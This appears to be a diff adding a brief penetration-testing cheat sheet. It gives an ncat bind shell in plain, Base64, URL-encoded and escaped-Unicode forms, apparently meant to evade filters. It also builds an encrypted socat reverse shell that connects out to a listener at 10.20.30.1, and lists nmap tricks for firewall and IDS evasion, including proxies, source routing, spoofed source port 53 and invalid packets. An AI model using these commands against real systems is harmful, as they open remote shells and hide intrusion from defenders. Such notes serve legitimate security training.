@@ -1,0 +1,35 @@
+
+==> BASE: ncat -lvnp 1234 -e /bin/bash
+
+bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA== (Base64)
+
+--> apt install gridsite-clients
+urlencode ncat -lvnp 1234 -e /bin/bash
+
+==> Escaped Unicode
+\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068
+
+==> Socat (TLS)
+1. Create Key
+openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.dudd3l.com/O=Dud3/C=UK' -nodes -keyout dud3-reverse.key -out dud3-reverse.crt
+cat dud3.key dud3-reverse.crt > dud3.pem
+
+2. Create listener
+socat -d -d OPENSSL-LISTEN:4443,cert=dud3.pem,verify=0,fork STDOUT
+
+3. Call home
+socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
+
+==> Proxy Server
+nmap -sS HTTP://PROXY_1:8080,SOCKS4://PROXY_2:4153 TARGET_IP
+-> Loose Routing
+--ip-options "L TARGET_IP_1 TARGET_IP_2"
+-> Strict Routing
+--ip-options "S TARGET_IP_1 TARGET_IP_2"
+
+==> Source Manipulation
+nmap -sU -Pn -g 53 -F TARGET_IP
+
+==> Send Invalid Packets
+--badsum
+--scanflags URGACKPSHRSTSYNFIN
